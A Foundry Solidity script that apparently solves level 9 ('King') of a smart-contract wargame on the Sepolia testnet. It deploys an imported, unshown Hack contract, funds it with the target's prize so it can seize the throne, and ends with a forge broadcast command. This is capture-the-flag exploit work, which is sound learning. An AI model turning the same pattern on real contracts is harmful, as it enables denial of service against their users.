// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {King, Hack} from "../src/level9.sol";

contract Level9Script is Script {
    function run(address instanceAddress) external {
        King target = King(payable(instanceAddress));
        uint256 prize = target.prize();
        console.log("prize: ", prize);
        vm.startBroadcast();
        Hack hackContract = new Hack(payable(instanceAddress));
        hackContract.hack{value: prize}();
        vm.stopBroadcast();
        console.log("target.prize: ", target.prize());
    }
}
//forge script script/level9.s.sol:Level9Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
